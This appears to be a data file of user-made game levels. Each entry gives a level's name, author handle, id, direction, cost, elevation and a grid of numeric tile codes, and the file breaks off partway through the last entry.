maps.push({name="Yellow Thing",author="tilgep",id="#1660419695",direction="forward",cost=59,elevation=-2,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,0,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,0,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,0,0,39,0,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,39,0,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,0,39,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0]});
maps.push({name="randomadventure",author="heavy",id="#1660420304",direction="right",cost=376,elevation=19,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,1,90,14,14,14,14,85,14,14,14,15,16,17,18,19,90,1,1,5,5,1,90,14,14,85,14,14,14,85,14,15,16,17,18,19,19,1,1,5,5,1,0,0,0,0,0,0,0,1,1,1,0,0,0,20,20,1,1,3,3,1,0,0,0,0,0,0,0,1,100,1,0,0,0,21,21,1,1,9,9,1,0,0,0,0,0,0,0,1,24,1,0,0,0,22,22,1,1,9,9,1,0,126,126,0,0,0,0,0,135,0,0,0,0,23,23,1,1,9,9,1,1,14,14,91,91,13,12,0,135,0,0,0,0,24,24,1,1,9,9,9,1,14,14,91,91,13,12,0,135,0,0,0,90,24,24,1,1,9,9,9,1,90,90,1,1,12,12,0,24,0,0,0,90,24,24,1,1,0,9,9,1,1,1,1,1,12,12,11,0,0,0,0,90,24,24,1,1,0,9,9,9,1,1,1,1,1,11,11,10,0,0,0,0,24,24,1,1,90,9,9,9,9,1,1,1,1,1,10,10,24,0,65,22,24,24,1,1,90,90,0,9,9,90,1,1,1,1,1,9,9,0,0,3,24,24,1,1,99,20,0,9,9,90,90,9,9,96,9,9,9,0,92,20,24,24,1,1,1,1,1,9,9,9,9,9,9,96,9,9,9,1,1,1,98,98,1,1,65,65,65,9,9,9,9,9,1,1,1,0,1,1,1,1,24,24,1,1,0,0,0,0,0,0,11,1,1,0,0,92,1,1,1,90,24,24,2,1,97,39,130,34,85,34,130,1,0,0,90,24,135,135,135,24,24,24,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="very interesting",author="tilgep",id="#1660425274",direction="left",cost=44,elevation=-3,map=[0,0,0,0,0,0,0,0,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,37,37,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,37,37,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,34,37,0,0,0,0,0,0,0,0,0,0,0,2,34,34,34,34,34,0,1,1,0,0,0,0,0,0,0,0,0,0,0,2,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="gan",author="zhugepiaoyi",id="#1660443441",direction="forward",cost=460,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,24,24,1,1,1,1,0,0,0,0,1,1,1,1,24,24,24,24,24,24,24,1,1,0,0,0,0,0,0,1,1,24,24,24,24,24,24,24,24,4,4,4,4,0,0,1,0,0,1,1,24,24,24,24,24,24,24,24,4,4,4,4,4,4,1,24,0,1,24,24,24,1,24,24,24,94,24,24,4,4,4,4,4,4,24,24,1,24,24,24,24,24,24,24,24,24,24,24,4,4,4,4,4,4,24,24,1,24,24,24,24,24,24,24,24,24,24,1,1,4,4,4,4,4,24,24,24,24,24,24,24,24,24,24,24,24,1,75,75,4,4,4,4,4,24,24,24,24,24,24,24,24,24,24,24,1,1,75,75,4,4,4,4,4,24,24,24,24,24,24,24,24,24,24,24,1,75,75,75,75,75,75,1,24,24,24,93,24,24,24,24,24,24,24,24,1,75,75,75,75,75,75,1,24,24,24,24,24,24,24,24,24,24,24,24,1,75,75,75,75,75,75,1,24,24,24,24,24,24,24,24,24,24,24,24,1,75,75,75,75,75,75,1,24,24,24,24,24,24,24,24,24,24,24,24,1,1,75,75,75,75,1,1,24,24,24,1,24,24,24,24,24,24,24,24,24,1,1,75,75,75,1,24,24,24,24,0,1,24,24,24,1,24,24,24,24,24,1,1,1,1,24,24,24,24,24,0,0,1,1,24,24,24,24,93,24,24,24,24,24,24,24,24,24,24,24,0,0,0,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,0,0,1,1,1,1,1,1,1,24,24,24,24,24,24,2,2]});
maps.push({name="Totemo",author="ZpLit",id="#1660447026",direction="left",cost=442,elevation=-3,map=[98,7,7,0,0,0,16,16,18,20,22,99,0,0,0,2,2,0,0,0,2,98,7,7,10,13,16,16,0,0,0,0,0,0,0,10,10,0,0,0,2,98,7,7,10,13,16,16,0,0,0,5,5,5,5,5,5,5,0,0,98,7,7,0,0,0,36,36,0,0,5,66,66,66,65,65,65,66,5,0,0,0,0,0,1,0,35,35,0,5,66,66,66,66,66,66,66,66,66,5,0,0,0,1,0,0,34,34,0,5,66,66,66,66,66,66,66,66,66,5,0,0,0,0,0,0,0,0,0,5,66,66,66,66,66,66,66,66,66,5,0,0,0,0,0,0,34,34,0,5,66,66,66,66,66,66,66,66,66,5,0,0,0,0,0,0,35,35,5,66,66,66,66,66,66,66,66,66,66,5,0,0,0,0,0,0,36,36,8,8,7,6,5,66,66,66,66,66,66,5,13,13,12,11,10,92,16,16,8,8,7,6,5,66,66,66,66,66,66,5,13,13,12,11,10,92,16,16,8,8,65,65,19,22,69,21,5,5,66,5,13,13,0,0,0,16,92,16,9,9,65,65,21,45,66,18,6,6,66,5,14,14,0,0,0,19,5,18,10,10,5,5,18,45,45,20,7,7,66,5,15,15,0,0,0,17,66,20,11,11,11,11,20,66,45,17,8,8,8,8,16,16,0,0,0,5,69,17,5,5,45,45,22,69,19,21,8,8,90,8,17,17,0,0,0,5,68,68,68,5,68,68,68,68,68,5,66,66,8,8,18,18,0,0,0,19,21,18,68,68,68,5,5,5,68,68,66,66,9,9,3,3,12,12,11,10,95,95,10,90,10,10,9,9,9,9,9,90,9,9,12,12,12,12,11,10,95,95,10,10,10,10,9,9,90,9,9,9,9,9]});
maps.push({name="SussySplit",author="Niikos",id="#1660491776",direction="left",cost=572,elevation=0,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,2,2,1,1,1,1,1,1,1,1,1,1,94,93,94,1,1,1,1,34,34,34,1,1,1,1,1,1,1,1,1,1,124,124,124,1,1,1,1,34,34,34,1,1,1,1,1,1,1,1,1,1,124,124,124,1,1,1,1,34,34,34,1,100,124,124,124,124,124,124,124,124,124,124,124,124,124,124,4,34,34,34,1,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,4,34,34,34,1,124,124,124,80,80,80,80,80,80,80,80,80,80,80,80,80,34,34,34,1,124,124,124,80,80,80,80,80,80,80,80,80,80,80,80,80,34,34,34,1,124,124,124,80,80,80,80,80,80,80,80,80,80,80,80,80,34,34,34,1,124,124,124,80,80,80,80,80,80,80,80,80,80,80,93,34,34,34,34,1,124,124,124,80,80,0,0,0,0,80,80,80,80,80,94,34,34,34,34,1,124,124,124,80,80,0,0,0,0,80,80,80,80,80,93,34,34,34,34,1,124,124,124,80,80,0,0,0,0,80,80,80,80,80,80,80,34,34,34,1,65,65,65,80,80,0,0,0,0,80,80,80,80,80,80,80,34,34,34,1,65,65,65,80,80,0,0,0,0,80,80,80,80,80,80,80,34,34,34,1,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,2,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,1,2,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,100,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Water In My Ass",author="MoistNoodlez",id="#1660491837",direction="forward",cost=76,elevation=10,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,66,66,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,66,66,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,66,66,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,66,66,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,89,89,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,89,89,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,89,89,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,19,19,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,89,89,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,95,95,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="Seaworld",author="MoistNoodlez",id="#1660492726",direction="forward",cost=256,elevation=0,map=[0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,127,127,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,0,5,5,0,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,0,88,88,0,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,0,5,5,0,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,66,0,0,0,0,66,66,66,0,0,0,0,0,0,0,0,0,0,66,66,0,5,5,5,5,0,66,66,0,0,0,0,0,0,0,0,5,0,66,66,0,5,96,96,5,0,66,66,0,5,0,0,0,0,0,0,97,0,66,66,0,1,2,2,1,0,66,66,0,97,0,0,0,0]});
maps.push({name="do jump",author="IDbunnyhop",id="#1660498925",direction="right",cost=100,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,2,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,2,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,25,0,0,0,0,25,0,0,0,0,0,0,0,25,0,0,0,0,25,0,25,0,0,0,0,25,0,0,0,0,0,0,0,25,0,0,0,0,25,0,25,0,0,0,0,25,0,0,0,0,0,0,0,25,0,0,0,0,25,0,25,0,0,0,0,25,0,0,0,0,0,0,0,25,0,0,0,0,25,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,6,7,8,9,10,10,0,0,5,5,5,5,5,0,0,0,0,0,5,5,6,7,8,9,10,10,0,0,5,5,5,5,5,0,0]});
maps.push({name="Punk Hazard v2",author="BlacK MaMBa",id="#1660500051",direction="forward",cost=602,elevation=16,map=[0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,5,5,1,1,1,0,0,0,0,0,0,66,66,66,66,1,1,75,75,76,6,6,76,75,76,1,1,66,66,66,66,66,66,66,1,75,75,75,76,7,7,88,76,75,75,76,76,1,66,66,66,66,66,1,75,75,75,76,9,9,9,76,75,75,75,75,75,76,1,66,66,66,66,1,75,75,76,11,11,88,76,75,76,76,76,75,75,76,1,66,66,66,1,75,75,76,12,12,12,76,75,75,76,76,76,75,75,76,76,1,66,66,1,75,76,13,13,13,76,75,75,75,76,76,76,75,75,75,76,1,66,66,1,76,14,14,14,22,22,22,22,22,22,22,22,22,22,22,22,22,66,66,66,18,18,95,18,18,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,18,18,14,18,18,66,66,66,66,66,66,66,66,66,66,66,66,66,66,1,66,14,14,14,24,24,24,24,24,24,24,24,24,24,24,24,24,66,66,1,66,66,15,15,15,23,24,24,20,20,20,20,20,20,20,100,1,66,66,1,65,66,66,16,16,16,23,24,20,66,66,66,66,66,66,66,1,66,66,66,1,65,66,66,17,17,88,23,20,66,66,66,66,66,20,1,66,66,66,66,1,65,65,66,66,18,18,18,23,20,94,66,20,66,66,1,66,66,66,66,66,1,65,65,66,66,19,19,88,20,93,66,66,66,1,66,66,66,66,66,66,66,1,1,65,66,66,20,20,66,66,66,1,1,66,66,66,66,0,0,0,0,0,0,1,1,1,21,21,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="2way defends",author="bunnyhop",id="#1660504045",direction="forward",cost=335,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,105,105,47,106,106,48,107,107,49,108,108,108,108,108,108,1,1,5,5,5,105,105,47,106,106,48,107,107,49,108,108,108,90,108,108,1,1,5,5,1,1,1,1,1,1,1,1,1,1,1,108,108,1,108,108,1,1,105,105,1,14,14,14,1,0,0,0,0,0,1,108,90,108,108,108,1,1,105,105,1,14,100,14,1,0,0,0,0,0,1,108,108,108,108,108,1,1,47,47,1,14,14,13,13,1,0,0,0,0,1,1,1,1,108,108,1,1,106,106,1,1,1,13,12,12,1,0,0,0,0,0,0,1,49,49,1,1,106,106,1,0,0,1,12,11,11,1,0,0,0,0,0,1,107,107,1,1,48,48,1,0,0,0,1,11,10,10,1,0,0,0,0,1,107,107,1,1,107,107,1,0,0,0,0,1,10,9,9,1,0,0,0,1,48,48,1,1,107,107,1,0,0,0,0,0,1,9,8,8,1,0,0,1,106,106,1,1,49,49,1,0,0,0,0,0,0,1,8,7,7,1,0,1,106,106,1,1,108,108,1,1,1,1,0,0,0,0,1,7,6,6,1,1,47,47,1,1,108,108,108,108,108,1,0,0,0,0,0,1,6,5,5,5,5,5,1,1,108,108,108,90,108,1,0,0,0,0,0,0,1,5,5,5,5,5,1,1,108,90,1,108,108,1,1,1,1,1,1,1,1,5,5,5,5,5,1,1,108,108,108,108,108,108,49,107,107,48,106,106,47,5,5,5,5,5,1,1,108,108,108,108,108,108,49,107,107,48,106,106,47,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1]});
maps.push({name="do crouchjump",author="bunnyhop",id="#1660504119",direction="left",cost=152,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,47,47,47,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,47,47,47,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,47,47,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,47,47,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,47,47,1,2,105,105,105,105,47,47,1,1,1,1,1,1,1,1,1,1,47,47,1,2,105,105,105,105,47,47,105,105,105,47,47,105,105,105,47,47,105,105,1,1,1,1,1,1,47,47,105,105,105,47,47,105,105,105,47,47,105,105,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Water Landing",author="MoistNoodlez",id="#1660526488",direction="forward",cost=130,elevation=-3,map=[0,0,0,0,0,0,0,8,2,2,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,95,95,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="My Thighs",author="Shellbert",id="#1660527778",direction="left",cost=247,elevation=0,map=[0,0,0,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,24,24,24,24,80,24,24,24,1,1,1,1,0,0,0,0,0,0,1,24,24,24,1,24,24,80,24,24,24,24,24,24,1,1,1,0,0,0,1,24,24,24,22,1,24,24,80,80,1,1,1,24,24,24,24,1,0,0,1,24,24,24,22,1,1,24,24,24,80,0,0,1,24,1,24,24,1,1,24,24,24,24,22,1,0,1,1,24,24,1,0,0,1,0,1,1,0,1,24,24,24,24,22,22,1,0,1,24,24,24,1,0,0,0,0,0,0,1,24,24,24,24,22,22,1,0,0,1,1,24,24,1,0,0,0,0,0,1,24,24,24,24,22,22,22,1,0,0,0,1,24,24,1,0,0,0,0,1,24,24,24,24,80,80,1,0,0,0,0,0,1,24,24,1,0,0,0,0,1,80,80,80,62,62,62,1,0,0,0,0,0,1,24,24,1,0,0,1,64,62,62,62,62,62,62,1,0,0,0,0,0,0,1,24,24,1,1,64,64,64,64,64,62,62,62,1,0,0,0,0,0,0,1,24,24,24,1,64,64,64,64,64,64,62,62,1,0,0,0,0,0,0,0,1,1,1,0,2,64,64,64,64,64,62,62,1,0,0,0,0,0,0,0,0,0,0,0,2,64,64,64,62,62,62,1,0,0,0,0,0,0,0,0,0,0,0,0,64,64,64,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Are we there yet",author="Kitty Cat",id="#1660551320",direction="forward",cost=418,elevation=4,map=[1,5,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,139,5,1,1,5,5,5,1,5,132,5,1,5,134,5,1,5,137,5,1,5,5,1,1,5,5,5,1,5,5,5,1,5,87,5,1,5,5,5,1,5,5,1,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,1,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,1,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,1,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,1,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,1,1,5,5,5,1,5,5,5,1,5,5,5,1,5,5,5,1,5,127,1,1,5,5,5,1,5,5,5,1,5,5,5,1,7,5,5,1,86,86,1,1,5,5,5,1,5,5,5,1,5,5,5,1,9,5,5,1,86,86,1,1,5,5,5,1,5,5,5,1,5,5,5,1,11,5,5,1,86,86,1,1,5,5,5,1,5,5,5,1,5,5,5,1,13,5,5,1,86,86,1,1,5,5,5,1,5,5,5,1,5,5,5,1,15,5,5,1,88,88,1,1,5,5,5,1,5,5,5,1,5,5,5,1,17,5,5,1,9,9,1,1,5,5,5,1,5,5,5,1,5,5,5,1,19,5,5,1,9,9,1,1,5,5,5,1,5,5,5,1,5,5,5,1,21,5,5,1,9,9,1,1,5,5,5,1,5,5,5,1,5,5,5,1,23,5,5,1,9,9,1,1,5,131,5,1,5,133,5,1,5,136,5,1,93,138,5,1,95,95,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1]});
maps.push({name="Move with it",author="Kitty Cat",id="#1660554143",direction="forward",cost=172,elevation=12,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,11,12,128,45,45,51,51,51,51,51,51,51,51,51,51,51,51,51,51,51,11,12,128,45,45,0,0,0,94,94,0,0,0,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,62,62,62,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,62,97,62,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,62,62,62,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,62,62,62,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,93,62,62,62,61,60,59,58,57,57,0,0,0,45,45,0,0,0,0,0,93,62,62,62,61,60,59,58,57,57,0,0,0,45,45,0,0,0,0,0,62,62,62,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,96,96,96,0,0,0,0,0,57,57,0,0,0,45,45,0,0,0,0,0,96,100,96,0,0,0,0,0,57,57,0,0,0,5,5,0,0,0,0,0,62,62,62,0,0,0,0,0,57,57,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,57,57,0,0,0,126,126,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0]});
maps.push({name="Catherine fix",author="HaRyDe",id="#1660567474",direction="forward",cost=294,elevation=19,map=[19,19,17,0,0,0,0,5,2,2,5,0,20,93,0,0,0,0,0,0,4,24,0,1,0,22,0,5,5,5,5,22,0,0,0,0,0,0,0,0,0,92,0,77,5,7,7,5,5,5,5,7,7,5,77,0,0,0,0,0,0,0,0,77,7,20,7,9,9,24,9,7,9,7,77,0,0,0,0,0,0,0,0,77,9,11,13,11,9,11,17,11,9,11,77,0,0,0,0,0,0,24,0,77,15,15,22,17,15,11,13,15,13,11,77,0,0,0,0,0,0,93,0,77,1,15,13,24,13,24,17,24,1,17,77,0,0,0,0,0,0,0,0,77,1,17,15,24,1,15,17,15,17,15,77,0,0,0,0,0,0,0,1,77,17,24,19,17,19,17,24,19,24,24,77,24,0,0,0,0,0,0,0,19,19,21,21,19,19,21,21,19,21,19,19,0,0,0,0,0,0,0,20,24,24,24,24,24,24,24,24,24,24,24,24,21,0,22,0,0,0,22,24,24,24,24,24,87,87,87,87,24,24,24,24,24,24,24,0,0,0,1,96,96,1,1,1,24,24,97,24,1,1,1,1,1,1,1,1,0,1,1,22,22,0,0,1,1,1,1,1,1,0,0,0,99,24,24,1,1,20,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,1,1,22,1,0,0,0,0,0,0,0,0,0,0,0,0,1,22,1,1,22,22,22,92,0,0,20,22,86,86,22,20,0,0,0,0,92,22,22,22,1,1,22,1,0,0,0,0,24,24,0,0,0,0,0,0,1,22,1,1,1,77,0,0,0,0,0,1,98,98,1,0,0,0,0,0,0,0,77,1,1,1,0,0,0,1,1,1,2,2,1,1,1,0,0,0,0,0,1,1]});
maps.push({name="butts",author="kyfg",id="#1660587602",direction="left",cost=88,elevation=19,map=[0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,16,16,0,0,16,3,0,93,0,0,0,0,0,5,5,0,18,18,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,5,5,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,6,6,0,0,0,19,19,0,0,15,15,0,0,0,0,0,0,0,0,0,6,6,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,7,7,0,0,0,0,0,20,20,0,0,14,14,0,0,0,0,0,0,0,7,7,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,